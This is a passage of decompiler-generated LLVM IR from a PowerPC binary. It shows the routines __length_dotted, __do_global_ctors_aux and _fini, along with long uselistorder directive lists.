43, 191, 5, 184, 185, 30, 202, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 33, 32, 117, 31, 121, 122, 34, 123, 124, 125, 126, 48, 49, 119, 118, 120, 271, 35, 272, 47, 36, 41, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 216, 215, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 172, 173, 174, 175, 37, 38, 176 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 10, 11, 12, 17, 13, 14, 18 }
  uselistorder i32* @r25, { 10, 11, 12, 14, 15, 13, 16, 1, 2, 17, 18, 19, 20, 21, 22, 23, 24, 25, 30, 33, 3, 4, 26, 27, 28, 29, 0, 6, 7, 8, 9, 31, 32, 5 }
  uselistorder i32* @r26, { 1, 29, 30, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 3, 4, 44, 45, 46, 47, 49, 2, 50, 51, 53, 54, 55, 56, 57, 58, 59, 9, 10, 76, 5, 6, 7, 72, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 73, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 0, 74, 75, 52, 27, 28, 48, 8 }
  uselistorder i32 ()* @__asm_mfcr, { 28, 33, 27, 26, 12, 32, 20, 34, 9, 8, 7, 6, 5, 15, 41, 40, 25, 39, 31, 30, 10, 29, 11, 38, 23, 21, 37, 19, 3, 14, 18, 13, 36, 24, 17, 16, 35, 4, 2, 1, 0, 22 }
  uselistorder label %dec_label_pc_1000fd04, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000fcf4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fcdc, { 1, 0 }
  uselistorder label %dec_label_pc_1000fcd8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fcc8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc84, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc6c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc64, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_1000fd20 = load i32, i32* @r3, align 4
  store i32 %v0_1000fd20, i32* %r11.global-to-local, align 4
  %v3_1000fd20 = icmp eq i32 %v0_1000fd20, 0
  %v0_1000fd28 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000fd20, i32 %v0_1000fd28)
  %v0_1000fd38 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000fd44

dec_label_pc_1000fd30:                            ; preds = %dec_label_pc_1000fd40
  %v1_1000fd30 = add i32 %v1_1000fd44, 2
  br label %dec_label_pc_1000fd60

dec_label_pc_1000fd40:                            ; preds = %dec_label_pc_1000fd44
  %v2_1000fd58 = add i32 %v1_1000fd48, %v5_1000fd44
  %v3_1000fd54 = icmp eq i32 %v1_1000fd50, 192
  br i1 %v3_1000fd54, label %dec_label_pc_1000fd30, label %dec_label_pc_1000fd44

dec_label_pc_1000fd44:                            ; preds = %dec_label_pc_1000fd40, %entry
  %v1_1000fd44 = phi i32 [ %v2_1000fd58, %dec_label_pc_1000fd40 ], [ %v0_1000fd38, %entry ]
  %v0_1000fd44 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000fd44 = add i32 %v0_1000fd44, %v1_1000fd44
  %v3_1000fd44 = inttoptr i32 %v2_1000fd44 to i8*
  %v4_1000fd44 = load i8, i8* %v3_1000fd44, align 1
  %v5_1000fd44 = zext i8 %v4_1000fd44 to i32
  %v1_1000fd48 = add i32 %v1_1000fd44, 1
  %v3_1000fd4c = icmp eq i8 %v4_1000fd44, 0
  %v1_1000fd50 = call i32 @__asm_rlwinm(i32 %v5_1000fd44, i32 0, i32 24, i32 25)
  br i1 %v3_1000fd4c, label %dec_label_pc_1000fd60, label %dec_label_pc_1000fd40

dec_label_pc_1000fd60:                            ; preds = %dec_label_pc_1000fd44, %dec_label_pc_1000fd30
  %v1_1000fd60 = phi i32 [ %v1_1000fd30, %dec_label_pc_1000fd30 ], [ %v1_1000fd48, %dec_label_pc_1000fd44 ]
  %v0_1000fd60 = load i32, i32* @r4, align 4
  %v2_1000fd60 = sub i32 %v1_1000fd60, %v0_1000fd60
  ret i32 %v2_1000fd60

; uselistorder directives
  uselistorder i32 %v1_1000fd48, { 1, 0 }
  uselistorder i32 %v5_1000fd44, { 1, 0 }
  uselistorder i32 %v1_1000fd44, { 2, 1, 0 }
  uselistorder i32 %v0_1000fd20, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 38, 6, 7, 8, 1, 52, 53, 2, 46, 3, 47, 0, 51, 4, 54, 55, 56, 9, 36, 37, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 39, 40, 41, 42, 35, 50, 43, 44, 45, 48, 49, 57 }
  uselistorder i32 25, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 24, { 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 12, 36, 37, 45, 38, 39, 42, 13, 5, 47, 6, 14, 43, 40, 41, 15, 16, 17, 18, 19, 20, 21, 22, 23, 49, 50, 44, 7, 8, 9, 10, 11, 1, 2, 3, 4, 24, 25, 46, 0, 48 }
  uselistorder i8 0, { 37, 35, 4, 38, 2, 39, 40, 24, 44, 42, 23, 43, 41, 22, 45, 46, 47, 48, 5, 50, 49, 25, 6, 51, 52, 7, 53, 54, 21, 27, 57, 55, 56, 26, 58, 59, 8, 61, 60, 28, 62, 63, 0, 64, 65, 66, 9, 67, 10, 68, 11, 1, 12, 69, 70, 71, 73, 74, 75, 76, 72, 77, 13, 78, 79, 80, 81, 83, 84, 85, 86, 82, 87, 3, 14, 15, 16, 17, 18, 19, 88, 90, 89, 20, 91, 92, 93, 94, 95, 96, 98, 29, 99, 100, 97, 101, 102, 103, 104, 106, 105, 107, 108, 109, 110, 111, 113, 112, 114, 30, 116, 115, 36, 117, 31, 118, 120, 121, 119, 32, 122, 123, 34, 124, 33, 125, 126, 127, 128, 129, 130, 131 }
  uselistorder i32 192, { 1, 2, 0 }
  uselistorder i32 2, { 0, 4, 110, 49, 111, 112, 30, 1, 2, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 5, 125, 6, 87, 88, 89, 31, 29, 126, 127, 128, 129, 130, 50, 51, 52, 94, 95, 146, 42, 7, 8, 3, 53, 136, 9, 10, 32, 133, 134, 40, 96, 97, 11, 98, 99, 100, 54, 55, 90, 56, 91, 57, 92, 147, 33, 12, 13, 14, 47, 48, 58, 59, 137, 46, 149, 15, 16, 17, 18, 34, 35, 36, 37, 38, 60, 144, 145, 39, 131, 132, 101, 102, 103, 19, 20, 21, 22, 23, 104, 105, 24, 107, 108, 109, 28, 106, 135, 61, 25, 26, 148, 150, 62, 93, 64, 65, 63, 66, 43, 67, 68, 44, 70, 71, 69, 72, 74, 73, 75, 76, 77, 78, 79, 138, 139, 140, 141, 80, 41, 142, 81, 82, 83, 84, 85, 143, 45, 27, 86 }
  uselistorder i32* @r4, { 80, 81, 1, 82, 83, 84, 85, 2, 86, 87, 88, 89, 9, 10, 90, 91, 92, 93, 94, 95, 96, 97, 98, 121, 118, 119, 99, 100, 101, 102, 103, 6, 104, 105, 106, 115, 116, 45, 11, 54, 55, 56, 57, 58, 59, 60, 61, 131, 7, 8, 15, 16, 123, 28, 29, 14, 78, 79, 17, 18, 120, 19, 12, 107, 108, 114, 117, 124, 125, 126, 3, 62, 63, 64, 13, 65, 66, 109, 110, 111, 112, 113, 4, 130, 67, 68, 69, 70, 0, 71, 72, 73, 122, 74, 75, 76, 5, 20, 21, 127, 128, 129, 22, 23, 24, 25, 26, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 77 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 10, 11, 13, 14, 15, 16, 17, 18, 1, 29, 31, 26, 2, 3, 4, 5, 6, 7, 30, 25, 21, 22, 23, 24, 8, 19, 20, 12, 33, 32, 9, 27, 0, 28 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10024000.634 to i32), i32* %r31.global-to-local, align 4
  %v3_1000fd84 = load i32, i32* @global_var_10024000.634, align 4
  %v3_1000fd88 = icmp eq i32 %v3_1000fd84, -1
  br i1 %v3_1000fd88, label %dec_label_pc_1000fda4, label %dec_label_pc_1000fd90

dec_label_pc_1000fd90:                            ; preds = %entry, %dec_label_pc_1000fd90
  %v0_1000fd90 = phi i32 [ %v3_1000fd98, %dec_label_pc_1000fd90 ], [ %v3_1000fd84, %entry ]
  call void @__pseudo_call(i32 %v0_1000fd90)
  %v0_1000fd98 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000fd98 = add i32 %v0_1000fd98, -4
  %v2_1000fd98 = inttoptr i32 %v1_1000fd98 to i32*
  %v3_1000fd98 = load i32, i32* %v2_1000fd98, align 4
  store i32 %v1_1000fd98, i32* %r31.global-to-local, align 4
  %v3_1000fd9c = icmp eq i32 %v3_1000fd98, -1
  br i1 %v3_1000fd9c, label %dec_label_pc_1000fda4, label %dec_label_pc_1000fd90

dec_label_pc_1000fda4:                            ; preds = %dec_label_pc_1000fd90, %entry
  %v0_1000fdb4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000fdb4

; uselistorder directives
  uselistorder i32 %v3_1000fd98, { 1, 0 }
  uselistorder i32 -4, { 28, 12, 13, 14, 21, 22, 23, 24, 25, 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 10, 27, 26, 32, 33, 29, 30, 31, 17, 18, 19, 20, 0, 11, 1 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 3, 4, 0 }
  uselistorder i32 -1, { 358, 359, 16, 47, 59, 295, 296, 252, 127, 297, 60, 298, 51, 61, 299, 62, 300, 223, 224, 110, 111, 64, 63, 225, 48, 49, 226, 227, 228, 185, 70, 68, 66, 229, 230, 231, 69, 67, 65, 232, 233, 186, 234, 187, 301, 25, 26, 188, 302, 189, 52, 303, 71, 253, 128, 3, 4, 254, 255, 53, 256, 257, 72, 73, 190, 360, 29, 30, 31, 361, 191, 365, 27, 28, 305, 32, 315, 316, 317, 131, 318, 319, 320, 321, 322, 323, 324, 129, 325, 130, 326, 327, 328, 329, 192, 258, 193, 54, 5, 194, 259, 260, 195, 196, 197, 261, 198, 330, 331, 33, 34, 35, 199, 332, 333, 200, 306, 310, 311, 50, 262, 263, 264, 119, 55, 265, 266, 267, 268, 132, 269, 6, 74, 270, 271, 272, 273, 274, 201, 275, 133, 343, 344, 134, 7, 8, 135, 56, 276, 202, 203, 277, 278, 279, 280, 75, 76, 348, 136, 77, 78, 79, 80, 81, 82, 83, 0, 368, 366, 84, 238, 239, 137, 204, 240, 38, 39, 205, 241, 36, 37, 206, 250, 9, 138, 235, 10, 85, 57, 293, 40, 41, 207, 139, 112, 294, 86, 236, 349, 350, 46, 237, 364, 242, 87, 243, 208, 244, 42, 43, 245, 246, 347, 58, 209, 334, 113, 335, 336, 140, 340, 88, 345, 369, 370, 281, 341, 89, 210, 211, 337, 338, 212, 339, 117, 213, 214, 215, 216, 217, 44, 218, 141, 90, 312, 114, 307, 309, 308, 17, 18, 19, 20, 21, 22, 23, 115, 116, 282, 15, 283, 11, 284, 285, 219, 142, 24, 220, 286, 287, 1, 289, 290, 2, 143, 144, 221, 45, 145, 120, 291, 146, 288, 313, 12, 13, 292, 147, 314, 148, 304, 149, 91, 92, 93, 362, 363, 94, 95, 96, 97, 98, 99, 100, 101, 102, 247, 103, 104, 105, 106, 107, 108, 367, 109, 371, 150, 183, 248, 249, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 121, 161, 162, 163, 251, 164, 165, 166, 167, 168, 14, 169, 170, 342, 184, 222, 171, 172, 173, 174, 346, 175, 118, 176, 122, 123, 124, 125, 126, 177, 178, 351, 352, 353, 179, 354, 355, 356, 357, 180, 181, 182 }
  uselistorder i32 1, { 309, 824, 321, 825, 826, 827, 828, 829, 830, 233, 234, 232, 831, 461, 832, 833, 29, 30, 28, 31, 527, 169, 170, 834, 397, 835, 401, 838, 839, 840, 841, 842, 462, 843, 844, 845, 109, 108, 113, 112, 111, 110, 114, 107, 115, 846, 847, 848, 528, 117, 120, 118, 116, 119, 121, 849, 70, 71, 850, 40, 851, 17, 15, 14, 16, 387, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 530, 529, 270, 269, 268, 271, 272, 273, 716, 717, 718, 719, 531, 525, 160, 152, 162, 151, 157, 158, 159, 156, 154, 155, 153, 161, 163, 412, 852, 853, 390, 854, 855, 856, 857, 859, 860, 532, 34, 33, 35, 32, 36, 450, 864, 861, 862, 863, 533, 229, 227, 226, 223, 225, 228, 230, 222, 221, 224, 220, 219, 865, 747, 748, 749, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 127, 124, 125, 122, 129, 123, 126, 128, 402, 750, 231, 130, 37, 187, 403, 760, 197, 198, 196, 199, 38, 761, 535, 534, 139, 138, 140, 281, 322, 1011, 463, 464, 537, 536, 295, 291, 294, 293, 290, 292, 540, 539, 538, 132, 133, 541, 884, 388, 885, 888, 889, 890, 891, 892, 543, 542, 323, 324, 326, 325, 906, 907, 908, 384, 909, 910, 413, 911, 912, 433, 434, 465, 414, 427, 913, 467, 437, 914, 915, 468, 916, 917, 918, 466, 549, 548, 547, 546, 517, 545, 544, 100, 99, 96, 98, 101, 95, 102, 97, 103, 0, 976, 977, 978, 979, 415, 80, 751, 752, 75, 76, 753, 317, 316, 315, 314, 318, 762, 191, 193, 192, 194, 763, 764, 469, 765, 179, 180, 181, 149, 150, 145, 148, 147, 146, 470, 893, 896, 518, 68, 67, 69, 473, 766, 767, 768, 471, 769, 472, 770, 771, 772, 773, 774, 560, 559, 558, 557, 556, 555, 554, 553, 552, 551, 519, 550, 212, 205, 209, 210, 204, 211, 215, 213, 208, 214, 203, 207, 216, 206, 217, 218, 202, 201, 200, 964, 451, 21, 20, 18, 19, 22, 143, 142, 144, 1013, 1014, 311, 312, 310, 775, 776, 561, 331, 327, 328, 330, 329, 332, 416, 777, 564, 563, 562, 168, 167, 165, 166, 333, 334, 313, 164, 474, 565, 137, 475, 439, 438, 566, 721, 570, 569, 568, 567, 262, 261, 258, 259, 264, 260, 263, 1015, 573, 572, 571, 254, 257, 256, 255, 1016, 574, 740, 741, 742, 452, 743, 84, 85, 86, 476, 744, 720, 93, 89, 87, 91, 88, 92, 90, 94, 819, 417, 820, 575, 336, 335, 337, 338, 339, 340, 82, 83, 81, 49, 45, 48, 47, 50, 52, 46, 51, 576, 577, 578, 188, 580, 579, 55, 53, 54, 39, 74, 73, 72, 183, 182, 398, 581, 341, 1012, 342, 477, 478, 584, 583, 582, 284, 283, 285, 286, 282, 287, 185, 440, 585, 586, 587, 588, 589, 590, 591, 592, 453, 454, 919, 418, 479, 920, 921, 441, 931, 595, 594, 593, 378, 381, 377, 376, 379, 375, 373, 374, 380, 372, 382, 383, 596, 597, 598, 965, 966, 24, 23, 1017, 600, 599, 343, 602, 601, 26, 25, 27, 603, 956, 957, 958, 13, 12, 11, 8, 10, 9, 836, 837, 778, 779, 604, 344, 346, 345, 347, 934, 935, 936, 937, 938, 939, 940, 941, 942, 944, 943, 945, 946, 172, 171, 178, 176, 175, 177, 174, 173, 404, 780, 922, 923, 924, 925, 926, 927, 928, 929, 930, 239, 242, 240, 241, 243, 1002, 1003, 1004, 737, 391, 106, 105, 104, 887, 886, 405, 858, 249, 1025, 1026, 247, 244, 248, 245, 246, 1021, 1022, 1023, 1024, 350, 349, 348, 184, 480, 442, 897, 898, 899, 428, 406, 79, 78, 77, 895, 605, 56, 419, 481, 894, 607, 606, 608, 298, 297, 296, 609, 307, 308, 306, 305, 610, 300, 299, 781, 782, 483, 783, 784, 785, 786, 787, 788, 790, 791, 792, 484, 793, 794, 420, 795, 482, 796, 485, 797, 798, 799, 789, 614, 613, 612, 611, 63, 62, 59, 57, 58, 60, 65, 64, 61, 800, 801, 802, 803, 804, 353, 351, 352, 354, 355, 486, 288, 289, 805, 806, 43, 42, 44, 41, 808, 421, 809, 399, 422, 811, 812, 813, 814, 423, 816, 425, 815, 810, 520, 621, 620, 619, 618, 617, 616, 615, 359, 361, 356, 360, 358, 363, 357, 362, 364, 407, 408, 274, 275, 276, 807, 443, 521, 487, 279, 278, 277, 1019, 444, 1020, 900, 901, 902, 903, 904, 905, 409, 623, 622, 6, 4, 7, 5, 625, 624, 366, 367, 365, 627, 626, 882, 883, 629, 628, 131, 195, 302, 303, 368, 250, 304, 266, 189, 630, 251, 265, 320, 369, 631, 252, 370, 253, 235, 280, 186, 632, 237, 633, 236, 1018, 634, 319, 722, 424, 429, 400, 723, 724, 725, 385, 490, 726, 727, 728, 426, 729, 730, 731, 732, 733, 488, 489, 435, 491, 734, 641, 640, 639, 638, 637, 636, 635, 735, 736, 646, 645, 644, 522, 643, 642, 492, 738, 739, 647, 745, 746, 493, 494, 754, 495, 652, 651, 650, 649, 648, 755, 756, 496, 757, 758, 759, 657, 656, 655, 654, 653, 817, 658, 818, 662, 661, 660, 659, 821, 497, 498, 822, 823, 666, 665, 664, 663, 267, 445, 499, 500, 669, 668, 667, 455, 932, 671, 670, 136, 135, 134, 430, 389, 933, 431, 672, 446, 947, 501, 502, 949, 392, 948, 503, 675, 674, 673, 386, 950, 951, 504, 505, 506, 959, 523, 952, 953, 447, 448, 507, 954, 508, 955, 393, 682, 681, 680, 679, 678, 677, 676, 396, 960, 961, 456, 962, 509, 963, 394, 685, 684, 683, 686, 967, 968, 969, 510, 970, 971, 395, 972, 511, 973, 689, 688, 687, 524, 974, 301, 975, 141, 458, 980, 981, 457, 982, 983, 459, 460, 984, 985, 986, 1, 2, 988, 987, 512, 692, 691, 690, 513, 989, 990, 693, 695, 694, 697, 696, 514, 698, 991, 992, 449, 999, 1000, 432, 1001, 699, 436, 3, 701, 700, 411, 993, 994, 410, 997, 998, 515, 516, 995, 996, 702, 66, 1005, 1006, 238, 1007, 1008, 1009, 371, 1010, 704, 703, 190, 526 }
  uselistorder label %dec_label_pc_1000fd90, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_1000fdd0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000fdd0

; uselistorder directives
  uselistorder i32* @r3, { 19, 20, 166, 167, 170, 168, 169, 0, 171, 10, 172, 53, 54, 55, 173, 176, 177, 47, 178, 21, 11, 93, 94, 12, 22, 111, 112, 113, 259, 271, 268, 269, 179, 187, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 13, 225, 226, 227, 228, 229, 230, 231, 232, 233, 95, 96, 14, 97, 98, 99, 23, 114, 115, 116, 117, 118, 15, 234, 42, 24, 119, 120, 121, 122, 123, 124, 2, 1, 125, 126, 127, 25, 272, 50, 284, 26, 43, 27, 3, 41, 61, 62, 49, 278, 279, 280, 156, 157, 158, 159, 160, 161, 162, 163, 56, 57, 58, 59, 60, 248, 249, 63, 44, 64, 18, 28, 260, 261, 270, 65, 235, 236, 237, 238, 239, 240, 241, 242, 29, 30, 31, 32, 281, 282, 4, 128, 129, 130, 131, 266, 174, 175, 16, 33, 283, 34, 193, 194, 195, 196, 197, 198, 199, 35, 188, 189, 190, 191, 192, 66, 67, 200, 201, 68, 69, 132, 36, 133, 134, 135, 5, 9, 6, 136, 7, 137, 8, 138, 139, 140, 141, 142, 143, 37, 144, 145, 146, 147, 148, 149, 52, 273, 274, 275, 276, 277, 202, 203, 204, 205, 206, 207, 208, 209, 150, 151, 152, 180, 181, 182, 183, 184, 185, 186, 70, 71, 38, 72, 73, 74, 75, 76, 78, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 153, 154, 155, 51, 164, 165, 243, 244, 245, 246, 247, 250, 17, 251, 252, 253, 254, 255, 256, 257, 45, 258, 46, 262, 263, 264, 265, 267, 39, 40, 48 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268500452, i32* @lr, align 4
  %v0_1000fde0 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_1000fde0

; uselistorder directives
  uselistorder i32 0, { 1063, 1064, 36, 1067, 119, 1065, 1066, 60, 1068, 1069, 1070, 1073, 1071, 0, 1072, 1074, 25, 870, 871, 1090, 1077, 1080, 1081, 1082, 319, 1083, 1084, 1086, 1085, 1087, 1088, 1089, 1091, 1092, 1093, 1075, 1076, 1078, 1079, 120, 1094, 1096, 1097, 1095, 1098, 1099, 1100, 1101, 236, 702, 1102, 237, 703, 704, 121, 122, 713, 714, 97, 715, 716, 717, 718, 719, 720, 721, 123, 182, 723, 722, 124, 724, 725, 126, 125, 726, 320, 727, 728, 729, 128, 127, 730, 731, 246, 321, 732, 129, 1103, 1104, 1105, 1106, 1112, 1107, 64, 1113, 1114, 1108, 1109, 1110, 61, 62, 63, 1115, 322, 37, 38, 39, 224, 1117, 130, 1116, 323, 1118, 1119, 1120, 1121, 131, 1122, 98, 40, 1123, 183, 1124, 1125, 1126, 847, 184, 872, 873, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 874, 26, 875, 133, 132, 876, 877, 878, 879, 134, 1134, 1135, 1136, 1137, 880, 881, 882, 883, 884, 885, 886, 887, 27, 1138, 1354, 324, 1357, 67, 325, 247, 1358, 326, 1361, 1362, 65, 66, 1363, 1355, 1356, 327, 328, 1152, 1145, 329, 68, 1146, 1147, 1148, 41, 1150, 1151, 1175, 1176, 1196, 1197, 1198, 1199, 248, 234, 235, 331, 1200, 1201, 1202, 1204, 185, 1207, 332, 249, 1209, 1210, 1211, 1212, 330, 250, 1206, 1203, 1205, 1208, 1213, 238, 1214, 1215, 1216, 1, 1282, 1283, 1284, 136, 135, 1285, 2, 137, 251, 848, 849, 850, 3, 888, 889, 187, 891, 890, 57, 4, 892, 186, 5, 893, 189, 894, 58, 6, 895, 188, 1217, 1218, 69, 1219, 1220, 1221, 1222, 1223, 1153, 1154, 1169, 333, 1170, 1171, 1172, 896, 897, 898, 899, 900, 334, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 138, 139, 914, 915, 916, 917, 918, 919, 920, 921, 922, 42, 923, 335, 93, 924, 925, 926, 927, 928, 140, 929, 930, 931, 932, 933, 934, 935, 936, 1269, 1270, 141, 1271, 1272, 1273, 306, 307, 1274, 1275, 1276, 28, 7, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 99, 1364, 1365, 1366, 1369, 1367, 8, 190, 957, 956, 191, 955, 100, 958, 959, 960, 142, 961, 1293, 1307, 1308, 252, 1309, 863, 1370, 1371, 1372, 1373, 1374, 1310, 336, 337, 338, 1390, 1391, 339, 1396, 1416, 192, 1417, 340, 341, 1408, 9, 1375, 1376, 253, 143, 742, 743, 342, 254, 343, 744, 745, 72, 73, 746, 747, 748, 344, 749, 750, 751, 70, 71, 752, 753, 1377, 1378, 1379, 1380, 1381, 1382, 144, 345, 1389, 806, 807, 808, 809, 810, 145, 811, 812, 813, 308, 814, 346, 815, 347, 733, 734, 735, 146, 736, 147, 1056, 1057, 193, 101, 118, 1058, 1059, 10, 1244, 737, 738, 148, 739, 740, 741, 1313, 1315, 43, 1316, 74, 1317, 1314, 1311, 1312, 11, 758, 754, 755, 756, 757, 194, 12, 1320, 1318, 1319, 195, 1321, 1322, 759, 760, 761, 762, 763, 348, 764, 765, 1323, 1324, 349, 1325, 149, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 13, 14, 705, 766, 767, 768, 75, 76, 769, 15, 350, 309, 310, 351, 1224, 1225, 196, 1226, 1227, 1228, 1229, 1235, 1236, 1237, 1238, 150, 1239, 1240, 1286, 1277, 255, 352, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 353, 1405, 16, 17, 1264, 151, 152, 962, 963, 29, 30, 256, 31, 964, 197, 18, 1245, 1246, 1247, 77, 965, 966, 198, 354, 967, 1230, 1231, 1232, 1233, 1234, 1346, 1347, 199, 1149, 19, 92, 1111, 200, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1409, 1410, 1411, 78, 1412, 1413, 1414, 1415, 153, 968, 969, 970, 971, 972, 973, 154, 1173, 1155, 1156, 1157, 1158, 1159, 1166, 1162, 1163, 1164, 1165, 201, 1167, 1168, 1160, 20, 79, 1161, 770, 1174, 771, 772, 974, 975, 102, 976, 977, 978, 979, 980, 239, 981, 982, 983, 155, 984, 985, 986, 987, 988, 156, 989, 990, 991, 992, 993, 994, 995, 157, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 44, 174, 175, 202, 1007, 1008, 158, 1009, 355, 1010, 1011, 356, 1014, 163, 159, 1012, 1013, 358, 1015, 1016, 1017, 1019, 164, 1020, 21, 22, 165, 166, 160, 161, 1021, 1022, 162, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 357, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 706, 1042, 1043, 32, 1045, 80, 103, 167, 359, 1048, 311, 1049, 1044, 1046, 1047, 1050, 1051, 168, 709, 710, 94, 59, 86, 1018, 203, 1384, 1386, 1385, 205, 169, 1388, 1387, 204, 257, 1177, 1178, 1179, 170, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 360, 1189, 1190, 1191, 1192, 1193, 1194, 240, 1052, 1053, 361, 1195, 1139, 1140, 1141, 1142, 1143, 1144, 1348, 1368, 362, 1060, 1359, 1360, 773, 1278, 1291, 774, 1297, 1392, 171, 1393, 1352, 1298, 1353, 775, 1299, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 1256, 1300, 1301, 786, 1383, 1394, 1395, 1406, 1407, 243, 364, 365, 206, 787, 368, 34, 35, 369, 788, 789, 377, 378, 459, 460, 33, 45, 241, 363, 707, 366, 242, 367, 790, 207, 104, 370, 791, 792, 793, 794, 796, 225, 795, 797, 798, 373, 374, 371, 372, 799, 375, 376, 260, 259, 258, 261, 208, 801, 379, 800, 382, 383, 380, 381, 802, 384, 803, 385, 804, 386, 805, 387, 46, 87, 105, 106, 107, 244, 391, 262, 172, 816, 817, 396, 818, 820, 390, 397, 819, 211, 821, 822, 823, 394, 824, 826, 389, 395, 825, 210, 827, 393, 828, 829, 830, 398, 831, 833, 388, 399, 832, 209, 834, 392, 835, 836, 837, 838, 839, 400, 840, 841, 842, 401, 843, 844, 845, 846, 108, 403, 265, 266, 263, 404, 856, 402, 851, 852, 853, 854, 855, 212, 857, 858, 405, 312, 859, 264, 860, 861, 862, 109, 177, 408, 270, 269, 228, 226, 227, 409, 91, 313, 864, 410, 407, 268, 865, 176, 411, 267, 231, 229, 230, 412, 406, 866, 867, 868, 869, 173, 413, 1054, 214, 1055, 213, 178, 414, 271, 416, 417, 418, 415, 419, 420, 421, 422, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 1061, 47, 1062, 272, 423, 424, 425, 426, 427, 428, 429, 48, 179, 440, 441, 442, 443, 273, 274, 275, 1241, 314, 1242, 245, 1243, 81, 88, 89, 96, 95, 49, 50, 444, 276, 277, 278, 279, 1255, 1249, 1251, 1252, 1253, 446, 1254, 447, 281, 280, 445, 82, 1248, 1250, 51, 110, 216, 215, 23, 24, 708, 448, 1257, 282, 283, 284, 285, 1258, 1259, 286, 287, 449, 83, 1260, 111, 90, 1265, 217, 180, 1266, 288, 1261, 1262, 450, 451, 452, 1263, 315, 454, 1267, 290, 289, 453, 84, 455, 1268, 291, 1279, 232, 458, 1280, 294, 457, 85, 1281, 293, 456, 218, 292, 52, 181, 1287, 1288, 316, 1289, 1290, 112, 53, 317, 1292, 219, 1294, 461, 462, 463, 295, 1295, 1296, 296, 464, 1302, 1303, 465, 1304, 1305, 1306, 466, 113, 299, 297, 298, 467, 468, 1345, 114, 54, 233, 220, 302, 303, 1334, 1335, 1336, 1337, 221, 300, 301, 304, 1338, 1339, 1340, 223, 55, 115, 116, 222, 1342, 1343, 1344, 318, 117, 56, 1341, 1349, 1350, 305, 1426, 1427, 1428, 1351, 711, 712, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 